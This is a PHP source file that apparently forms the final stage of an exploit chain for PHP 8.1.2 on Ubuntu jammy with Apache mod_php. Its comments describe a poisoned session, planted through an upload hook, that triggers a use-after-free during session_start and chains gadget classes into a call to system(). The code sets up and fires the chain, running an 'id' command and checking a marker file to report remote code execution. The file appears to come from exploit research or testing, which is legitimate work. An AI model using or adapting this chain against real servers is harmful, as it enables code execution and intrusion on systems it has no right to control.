<?php
// fa_jammy_reader.php — MISSION 3 stage-4 victim: jammy 8.1.2 Apache
// mod_php session reader. Declares the Stage1/FIRE gadget classes (the
// full pwn_zero4 chain, 8.1.2 offsets) BEFORE session_start; the poisoned
// session (planted through the wiped gap by the rfc1867 hook write) decodes
// the a:1020 trigger during session_start -> var_destroy walk frees the
// chained entries block -> Stage1::__destruct mid-walk -> M1 dance leak ->
// M2 oracle -> M3 forge -> var_dump -> zif_system -> marker.
$MARKER = '/tmp/fa_jammy_rce';

require_once __DIR__ . '/fa_cli_core.php';

D::$cmd = 'sh /tmp/fa_jammy_cmd';
E::init( '8102' );
@unlink( $MARKER );
file_put_contents( '/tmp/fa_jammy_cmd', 'id > ' . $MARKER . " 2>&1\n" );
@unlink( '/tmp/fa_jammy_diag.log' );

session_start();

echo 'fa-jammy-reader: handler=', ini_get( 'session.serialize_handler' ),
	' PHP ', PHP_VERSION, ' ', PHP_SAPI, "\n";
echo 'fa-jammy-reader: session vars=', count( $_SESSION ), "\n";
if ( is_file( $MARKER ) ) {
	echo 'fa-jammy-reader: MARKER=', trim( file_get_contents( $MARKER ) ), "\n";
	echo "[PASS] MISSION 3: jammy composition final stage = RCE (system() fired)\n";
} else {
	echo "fa-jammy-reader: no marker this shot\n";
}
